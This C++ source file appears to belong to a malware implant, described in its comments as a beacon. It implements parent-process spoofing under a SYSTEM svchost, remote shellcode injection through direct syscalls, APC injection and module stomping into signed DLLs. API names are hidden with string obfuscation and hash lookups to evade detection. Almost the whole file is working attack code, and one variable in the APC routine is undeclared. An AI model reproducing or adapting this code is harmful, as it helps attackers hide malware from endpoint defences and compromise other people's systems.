// injection.cpp — Real process injection via direct syscalls (no Win32 API wrappers).
// SpawnWithPPID: PPID spoofing via extended startup info attribute.
// InjectRemoteProcess: full NtOpenProcess → NtAllocateVirtualMemory →
//   NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx chain.
// StompModule: module stomping — overwrite .text of a signed DLL in remote process.
#include "injection.hpp"
#include "syscalls.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <tlhelp32.h>
#include <cstdint>
#include <string>
#include <vector>


// ============================================================
// PPID Spoofing — spawn a process under a legitimate parent.
// Makes the new process appear as a child of targetPath's parent
// rather than of the implant, fooling parent-chain heuristics.
// ============================================================
BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid,
                   HANDLE* hProcessOut, HANDLE* hThreadOut) {
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return FALSE;
    
    auto _OpenProcess = HASHPROC(hKernel32, OpenProcess);
    auto _InitializeProcThreadAttributeList = HASHPROC(hKernel32, InitializeProcThreadAttributeList);
    auto _UpdateProcThreadAttribute = HASHPROC(hKernel32, UpdateProcThreadAttribute);
    auto _DeleteProcThreadAttributeList = HASHPROC(hKernel32, DeleteProcThreadAttributeList);
    auto _CreateProcessW = (BOOL(WINAPI*)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION))HashProc(hKernel32, FNV("CreateProcessW"));

    if (!_OpenProcess || !_InitializeProcThreadAttributeList || !_UpdateProcThreadAttribute || !_DeleteProcThreadAttributeList || !_CreateProcessW)
        return FALSE;

    HANDLE hParent = _OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParent) return FALSE;

    // Calculate required attribute list size
    SIZE_T attrListSize = 0;
    _InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);

    std::vector<BYTE> attrBuf(attrListSize);
    auto* attrList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attrBuf.data());

    if (!_InitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize)) {
        CloseHandle(hParent);
        return FALSE;
    }

    if (!_UpdateProcThreadAttribute(
            attrList, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent),
            nullptr, nullptr)) {
        _DeleteProcThreadAttributeList(attrList);
        CloseHandle(hParent);
        return FALSE;
    }

    STARTUPINFOEXW si = {};
    si.StartupInfo.cb      = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList     = attrList;

    PROCESS_INFORMATION pi = {};
    std::wstring cmdLine   = L"\"" + std::wstring(targetPath) + L"\"";

    BOOL ok = _CreateProcessW(
        nullptr, &cmdLine[0],
        nullptr, nullptr,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
        nullptr, nullptr,
        &si.StartupInfo, &pi);

    DeleteProcThreadAttributeList(attrList);
    CloseHandle(hParent);

    if (!ok) return FALSE;

    // Hand off or close handles
    if (hProcessOut) *hProcessOut = pi.hProcess;
    else             CloseHandle(pi.hProcess);

    if (hThreadOut) *hThreadOut = pi.hThread;
    else { ResumeThread(pi.hThread); CloseHandle(pi.hThread); }

    return TRUE;
}

// ============================================================
// TryRespawnUnderSvchost — relaunch ourselves with svchost PPID.
// Uses a hidden env-var sentinel (__GHOST_SPAWNED=1) so the child
// skips this function and continues as the real beacon process.
// Returns true  → child was launched, caller should exit.
// Returns false → we ARE the svchost-parented child (keep running).
// ============================================================
bool TryRespawnUnderSvchost() {
    // If sentinel is set we're already the correctly-parented child
    wchar_t sentinel[4] = {};
    if (GetEnvironmentVariableW(L"__GHOST_SPAWNED", sentinel, 4) > 0)
        return false;

    DWORD svchostPid = FindBestSvchost();
    if (!svchostPid) return false; // no SYSTEM svchost found, just run in-place

    wchar_t selfPath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    // Set sentinel in our env before spawn — child inherits it (lpEnvironment=NULL).
    // Child reads it at startup and skips TryRespawnUnderSvchost, runs as the beacon.
    SetEnvironmentVariableW(L"__GHOST_SPAWNED", L"1");
    HANDLE hChild = nullptr, hThread = nullptr;
    if (!SpawnWithPPID(selfPath, svchostPid, &hChild, &hThread)) {
        SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);
        return false;
    }
    SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr); // clean our own env

    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hChild);
    return true;
}

// ============================================================
// Inline helpers — syscall with Win32 fallback for optional entries.
// ============================================================
static HANDLE OpenTarget(DWORD pid, DWORD access) {
    if (g_Syscalls.NtOpenProcess) {
        CLIENT_ID cid = {};
        cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
        OBJECT_ATTRIBUTES oa = {};
        InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
        HANDLE h = nullptr;
        if (g_Syscalls.NtOpenProcess(&h, access, &oa, &cid) == 0) return h;
        return nullptr;
    }
    return OpenProcess(access, FALSE, pid);
}

static void CloseTarget(HANDLE h) {
    if (!h) return;
    if (g_Syscalls.NtClose) g_Syscalls.NtClose(h);
    else CloseHandle(h);
}

static HANDLE CreateRemoteThreadFallback(HANDLE hProc, PVOID startAddr) {
    if (g_Syscalls.NtCreateThreadEx) {
        HANDLE hThread = nullptr;
        g_Syscalls.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr,
                                    hProc, startAddr, nullptr, 0, 0, 0, 0, nullptr);
        return hThread;
    }
    return CreateRemoteThread(hProc, nullptr, 0,
                              reinterpret_cast<LPTHREAD_START_ROUTINE>(startAddr),
                              nullptr, 0, nullptr);
}

// ============================================================
// Remote process injection via direct syscall chain.
// Optional syscalls fall back to Win32 equivalents if NULL.
// ============================================================
BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload,
                         SIZE_T payloadSize, HANDLE* hThreadOut) {
    if (!payload || payloadSize == 0) return FALSE;

    HANDLE hProc = OpenTarget(pid,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD);
    if (!hProc) return FALSE;

    // 2. Allocate RW region
    PVOID  base   = nullptr;
    SIZE_T region = payloadSize;
    if (g_Syscalls.NtAllocateVirtualMemory) {
        NTSTATUS st = g_Syscalls.NtAllocateVirtualMemory(
            hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st != 0) { CloseTarget(hProc); return FALSE; }
    } else {
        base = VirtualAllocEx(hProc, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!base) { CloseTarget(hProc); return FALSE; }
    }

    // 3. Write payload
    SIZE_T written = 0;
    if (g_Syscalls.NtWriteVirtualMemory) {
        NTSTATUS st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
        if (st != 0 || written != payloadSize) { CloseTarget(hProc); return FALSE; }
    } else {
        if (!WriteProcessMemory(hProc, base, payload, payloadSize, &written) || written != payloadSize) {
            CloseTarget(hProc); return FALSE;
        }
    }

    // 4. Flip to RX
    if (g_Syscalls.NtProtectVirtualMemory) {
        ULONG oldProt = 0;
        NTSTATUS st = g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
        if (st != 0) { CloseTarget(hProc); return FALSE; }
    } else {
        DWORD oldProt = 0;
        if (!VirtualProtectEx(hProc, base, payloadSize, PAGE_EXECUTE_READ, &oldProt)) {
            CloseTarget(hProc); return FALSE;
        }
    }

    // 5. Create remote thread
    HANDLE hThread = CreateRemoteThreadFallback(hProc, base);
    if (!hThread) { CloseTarget(hProc); return FALSE; }

    if (hThreadOut) *hThreadOut = hThread;
    else            CloseTarget(hThread);

    CloseTarget(hProc);
    return TRUE;
}

// ============================================================
// InjectViaApc — queue APC to an alertable thread
// ============================================================
BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
    if (!payload || payloadSize == 0) return FALSE;
    // APC injection requires NtSuspendThread/NtResumeThread/NtQueueApcThread;
    // fall back to a no-op if any are unavailable.
    if (!g_Syscalls.NtSuspendThread || !g_Syscalls.NtResumeThread || !g_Syscalls.NtQueueApcThread)
        return FALSE;

    HANDLE hProc = OpenTarget(pid,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD);
    if (!hProc) return FALSE;

    PVOID base = nullptr;
    SIZE_T region = payloadSize;
    if (g_Syscalls.NtAllocateVirtualMemory) {
        if (g_Syscalls.NtAllocateVirtualMemory(hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
            CloseTarget(hProc); return FALSE;
        }
    } else {
        base = VirtualAllocEx(hProc, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!base) { CloseTarget(hProc); return FALSE; }
    }

    SIZE_T written = 0;
    if (g_Syscalls.NtWriteVirtualMemory) {
        if (g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written) != 0 || written != payloadSize) {
            CloseTarget(hProc); return FALSE;
        }
    } else if (!WriteProcessMemory(hProc, base, payload, payloadSize, &written) || written != payloadSize) {
        CloseTarget(hProc); return FALSE;
    }

    if (g_Syscalls.NtProtectVirtualMemory) {
        ULONG oldProt = 0;
        if (g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt) != 0) {
            CloseTarget(hProc); return FALSE;
        }
    } else {
        DWORD oldProt = 0;
        if (!VirtualProtectEx(hProc, base, payloadSize, PAGE_EXECUTE_READ, &oldProt)) {
            CloseTarget(hProc); return FALSE;
        }
    }

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) { CloseTarget(hProc); return FALSE; }

    auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
    auto _Thread32First = HASHPROC(hKernel32, Thread32First);
    auto _Thread32Next = HASHPROC(hKernel32, Thread32Next);
    auto _OpenThread = HASHPROC(hKernel32, OpenThread);
    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);

    if (!_CreateToolhelp32Snapshot || !_Thread32First || !_Thread32Next || !_OpenThread || !_CloseHandle) {
        CloseTarget(hProc); return FALSE;
    }

    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { CloseTarget(hProc); return FALSE; }

    THREADENTRY32 te = {};
    te.dwSize = sizeof(te);
    BOOL queued = FALSE;

    if (_Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = _OpenThread(
                    THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                    FALSE, te.th32ThreadID);
                if (hThread) {
                    ULONG suspendCount = 0;
                    g_Syscalls.NtSuspendThread(hThread, &suspendCount);
                    st = g_Syscalls.NtQueueApcThread(
                        hThread, reinterpret_cast<PVOID>(base),
                        nullptr, nullptr, nullptr);
                    if (st == 0) {
                        queued = TRUE;
                        g_Syscalls.NtResumeThread(hThread, &suspendCount);
                        _CloseHandle(hThread);
                        break;
                    }
                    g_Syscalls.NtResumeThread(hThread, &suspendCount);
                    _CloseHandle(hThread);
                }
            }
        } while (_Thread32Next(snap, &te));
    }

    _CloseHandle(snap);
    CloseTarget(hProc);
    return queued;
}

// ============================================================
// Module stomping — overwrite .text section of a signed DLL
// that already exists in the target process.
//
// Steps:
//   1. Find which signed DLL is already loaded in target.
//   2. Read its PE to locate .text section (RVA + size).
//   3. NtProtectVirtualMemory → RW on that region.
//   4. NtWriteVirtualMemory shellcode into it.
//   5. NtProtectVirtualMemory → RX.
//   6. NtCreateThreadEx at stomped base.
// ============================================================
BOOL StompModule(DWORD pid, const wchar_t* dllPath,
                 const BYTE* shellcode, SIZE_T shellcodeSize) {
    if (!shellcode || shellcodeSize == 0) return FALSE;

    // 1. Open target
    HANDLE hProc = OpenTarget(pid,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ |
        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD);
    if (!hProc) return FALSE;

    // 2. Find module base in remote process via TH32CS_SNAPMODULE
    HMODULE remoteBase = nullptr;
    {
        HANDLE snap = CreateToolhelp32Snapshot(
            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
        if (snap != INVALID_HANDLE_VALUE) {
            MODULEENTRY32W me = {};
            me.dwSize = sizeof(me);
            if (Module32FirstW(snap, &me)) {
                do {
                    if (_wcsicmp(me.szExePath, dllPath) == 0) {
                        remoteBase = me.hModule;
                        break;
                    }
                } while (Module32NextW(snap, &me));
            }
            CloseHandle(snap);
        }
    }

    if (!remoteBase) {
        CloseTarget(hProc);
        return FALSE;
    }

    // 3. Read remote PE header to find .text section
    BYTE headerBuf[0x1000] = {};
    SIZE_T rdBytes = 0;

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) { CloseTarget(hProc); return FALSE; }
    auto _ReadProcessMemory = HASHPROC(hKernel32, ReadProcessMemory);
    if (!_ReadProcessMemory) { CloseTarget(hProc); return FALSE; }

    // Read via ReadProcessMemory (it's just a wrapper; fine here since we're
    // in injection context and not the syscall-sensitive critical path)
    if (!_ReadProcessMemory(hProc, remoteBase, headerBuf, sizeof(headerBuf), &rdBytes)) {
        CloseTarget(hProc); return FALSE;
    }

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(headerBuf);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { CloseTarget(hProc); return FALSE; }
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(headerBuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)  { CloseTarget(hProc); return FALSE; }

    // Find .text section
    PVOID  textVa   = nullptr;
    SIZE_T textSize = 0;
    {
        auto* sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            if (memcmp(sec->Name, ".text", 5) == 0) {
                textVa   = reinterpret_cast<BYTE*>(remoteBase) + sec->VirtualAddress;
                textSize = sec->Misc.VirtualSize;
                break;
            }
        }
    }

    if (!textVa || textSize < shellcodeSize) { CloseTarget(hProc); return FALSE; }

    // 4. RW → write shellcode → RX
    ULONG oldProt = 0;
    NTSTATUS st = g_Syscalls.NtProtectVirtualMemory(
        hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProt);
    if (st != 0) { CloseTarget(hProc); return FALSE; }

    SIZE_T writ = 0;
    st = g_Syscalls.NtWriteVirtualMemory(hProc, textVa, (PVOID)shellcode, shellcodeSize, &writ);
    if (st != 0 || writ != shellcodeSize) { CloseTarget(hProc); return FALSE; }

    ULONG dummy = 0;
    g_Syscalls.NtProtectVirtualMemory(hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READ, &dummy);

    // 5. Create thread at stomped .text base
    HANDLE hThread = CreateRemoteThreadFallback(hProc, textVa);
    if (hThread) CloseTarget(hThread);
    CloseTarget(hProc);
    return (hThread != nullptr);
}

// ============================================================
// FindBestSvchost — pick SYSTEM svchost.exe with lowest PID
// for migration. Most stable, oldest, least likely scrutinized.
// ============================================================
DWORD FindBestSvchost() {
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    auto hAdvapi32 = GetModuleHandleA(XS("advapi32.dll"));
    if (!hAdvapi32) hAdvapi32 = LoadLibraryA(XS("advapi32.dll"));
    if (!hKernel32 || !hAdvapi32) return 0;

    auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
    auto _Process32FirstW = HASHPROC(hKernel32, Process32FirstW);
    auto _Process32NextW = HASHPROC(hKernel32, Process32NextW);
    auto _OpenProcess = HASHPROC(hKernel32, OpenProcess);
    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
    
    auto _OpenProcessToken = HASHPROC(hAdvapi32, OpenProcessToken);
    auto _GetTokenInformation = HASHPROC(hAdvapi32, GetTokenInformation);
    auto _IsWellKnownSid = HASHPROC(hAdvapi32, IsWellKnownSid);

    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW || 
        !_OpenProcess || !_CloseHandle || !_OpenProcessToken || 
        !_GetTokenInformation || !_IsWellKnownSid) return 0;

    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    DWORD bestPid   = 0;
    DWORD lowestPid = DWORD(-1);

    // Decode once before the loop — XorStr::str() XORs buf in-place, so
    // calling it on every iteration re-encrypts and produces garbage.
    wchar_t svcName[16] = {};
    { auto tmp = XSW(L"svchost.exe"); wcsncpy_s(svcName, tmp.str(), _TRUNCATE); }

    if (_Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, svcName) != 0) continue;

            // Check if it runs as SYSTEM via token
            HANDLE hProc = _OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hTok = nullptr;
            if (_OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
                BYTE buf[256] = {};
                DWORD len = 0;
                if (_GetTokenInformation(hTok, TokenUser, buf, sizeof(buf), &len)) {
                    auto* tu = reinterpret_cast<TOKEN_USER*>(buf);
                    // SYSTEM SID: S-1-5-18
                    if (_IsWellKnownSid(tu->User.Sid, WinLocalSystemSid)) {
                        if (pe.th32ProcessID < lowestPid) {
                            lowestPid = pe.th32ProcessID;
                            bestPid   = pe.th32ProcessID;
                        }
                    }
                }
                _CloseHandle(hTok);
            }
            _CloseHandle(hProc);

        } while (_Process32NextW(snap, &pe));
    }

    _CloseHandle(snap);
    return bestPid;
}